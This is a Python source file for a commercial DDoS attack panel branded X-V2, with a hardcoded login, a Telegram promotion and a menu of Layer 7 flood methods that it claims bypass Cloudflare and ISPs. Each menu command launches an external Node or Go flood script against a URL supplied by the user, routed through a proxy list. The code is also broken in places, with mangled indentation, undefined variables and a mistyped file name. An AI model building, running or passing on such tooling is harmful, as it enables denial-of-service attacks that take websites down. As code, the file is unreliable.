import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.red_to_white, "WELCOME TO X-V1 | USER: ROOT | PLAN :: VVIP | Proxy: " + bots_str + " |FEEL HAPPY TO USE"))
    print("")
  
def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.red_to_white,'''
               
       .:                     ::        
        -#+=.             .-+*=         
         -**#*.          *###+          
          ==*#-   -=+   .=-++           
          .::--:.-###-. :-===           
           .:--:=:::--:=*-.             
               :-++=**+:                
                 .=-+:                  
                   =                    
               
 '                                                 
          
                 Telegram:t.me/teamARXU                                                         

                LIST OF LAYER7 METHODS
          
            
!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP💀
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND🔥
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE TAKE DOWN
!TLS2 - UPDATED VERSION OF TLS-1
!SKYNET- SEND HIGH PACKETS

HOW TO USE
TLS https://example.com 120   TLS URL TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.red_to_white
   , "WELCOME TO  X-V2 | USER: ROOT| PLAN :: VVIP | Proxy: " + bots_str + " |FEEL HAPPY TO USE"))
    print("")
    banner = '''
   
               .:                     ::        
        -#+=.             .-+*=         
         -**#*.          *###+          
          ==*#-   -=+   .=-++           
          .::--:.-###-. :-===           
           .:--:=:::--:=*-.             
               :-++=**+:                
                 .=-+:                  
                   = 

Type Layer7 or l7 or L7 To See Layer7 Methods⠀⠀⠀⠀⠀  

'''
    print(Colorate.Diagonal(Colors.red_to_white, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.red_to_white, "root@X-V2#~"))
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()

        elif "TLS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TLS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
   
     elif "TLS2" in cnc:
   try:
        host = cnc.split()[1]
        time = cnc.split()[2]
        print("Attacking " + host + " For " + time + " ")
        os.system(f'node TLS2.js {host} {time} {Rate} {threads} {proxyFile}')
    except IndexError:
        print('Usage: TLS2 <host> <Time> <Rate> <threads>')
        print('Example: TLS2 https://example.com 120 512 1000')



   
           elif "SKYNET" in cnc:  
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
               os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: Skynet <Target> <Time> <Rate> <threads> ')
                print('Example: Skynet https://example.com 120 512 1000')
                print(' Skynet ')             
            
            
      
                
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.tx')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');

        elif "help" in cnc:
            print(Colorate.Horizontal(Colors.red_to_white, ''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "ARXU"
    passwd = "RX"
    username = input("</> Username💀: ")
    password = getpass.getpass(prompt='</> Password🥸: ')
    if username != user or password != passwd:
        print("")
        print("Password or Username is invalid?? You have to buy subscriptions from Our channel")        
        sys.exit(1)
    elif username == user and password == passwd:
        print("WELCOME TO X-V2")
        time.sleep(0.3)
        main()
login()
